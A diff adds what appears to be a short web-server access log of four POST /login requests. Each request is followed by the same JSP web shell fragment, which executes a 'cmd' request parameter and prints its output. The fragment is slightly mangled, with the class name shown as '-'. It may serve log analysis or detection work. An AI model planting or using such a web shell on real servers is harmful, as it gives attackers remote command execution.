@@ -1,0 +1,8 @@
+172.18.0.1 - - [19/Jul/2025:08:05:33 +0900] "POST /login HTTP/1.1" 200 4193
+- java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } -
+172.18.0.1 - - [19/Jul/2025:08:13:27 +0900] "POST /login HTTP/1.1" 200 4193
+- java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } -
+172.18.0.1 - - [19/Jul/2025:08:28:19 +0900] "POST /login HTTP/1.1" 200 4193
+- java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } -
+172.18.0.1 - - [19/Jul/2025:08:48:14 +0900] "POST /login HTTP/1.1" 200 4193
+- java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } -
